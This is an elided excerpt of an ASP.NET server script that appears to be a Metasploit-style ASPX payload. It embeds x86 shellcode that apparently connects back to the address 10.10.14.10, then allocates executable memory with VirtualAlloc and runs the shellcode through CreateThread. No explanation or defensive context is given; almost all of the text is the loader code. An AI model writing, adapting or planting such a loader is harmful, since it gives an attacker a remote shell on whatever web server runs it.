...
<script runat="server">
    ...
    {
        byte[] e7EdYjp2mU = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,
0x8b,0x52,0x0c,0x8b,0x52,0x14,0x89,0xe5,0x31,0xff,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xc0,0xac,
0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,
0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x57,0x74,0x4c,0x01,0xd0,0x50,0x8b,0x58,0x20,0x8b,0x48,0x18,
...
0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x0a,
...
0xd5};
        ...
        IntPtr aJKwx = VirtualAlloc(IntPtr.Zero,(UIntPtr)e7EdYjp2mU.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(e7EdYjp2mU,0,aJKwx,e7EdYjp2mU.Length);
        IntPtr nVQoj1f = IntPtr.Zero;
        IntPtr dxVk_lWg_73W = CreateThread(IntPtr.Zero,UIntPtr.Zero,aJKwx,IntPtr.Zero,0,ref nVQoj1f);
    }
</script>
